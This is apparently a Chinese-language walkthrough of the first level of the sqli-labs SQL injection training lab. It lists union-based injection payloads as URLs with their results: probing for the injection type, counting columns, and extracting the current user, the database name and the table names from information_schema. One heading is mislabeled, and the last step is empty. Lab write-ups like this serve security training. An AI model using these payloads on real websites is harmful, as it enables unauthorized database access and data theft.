# sqli-lab

## Less-1

1.判断注入类型

```
http://212.64.13.182:30001/Less-1/?id=1               有回显
http://212.64.13.182:30001/Less-1/?id=1'              报错，可能字符型注入
http://212.64.13.182:30001/Less-1/?id=1' or '1'='1    正常显示
http://212.64.13.182:30001/Less-1/?id=1' and '1'='2   有回显，但是没数据，确定为字符型注入
```

2.判断列数

```
http://212.64.13.182:30001/Less-1/?id=1' order by 5 %23   查无此列
http://212.64.13.182:30001/Less-1/?id=1' order by 3 %23   正常显示
http://212.64.13.182:30001/Less-1/?id=1' order by 4 %23   查无此列，确定为3列
```

3.判断顺序

```
http://212.64.13.182:30001/Less-1/?id=-1' union select 1,2,3 %23   回显2,3
```

4.查询当前用户和数据库名

```
http://212.64.13.182:30001/Less-1/?id=-1' union select 1,user(),database() %23
回显root@localhost，security
```

在数据库中，有一个数据库：information_schema,是Mysql自带的信息数据库，information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限

5.查询所有数据库名

```
http://212.64.13.182:30001/Less-1/?id=-1' union select 1,user(),group_concat(table_name) from  information_schema.tables where table_schema=database() %23                        回显  emails,referers,uagents,users
```

6.查询所有表名

```

```

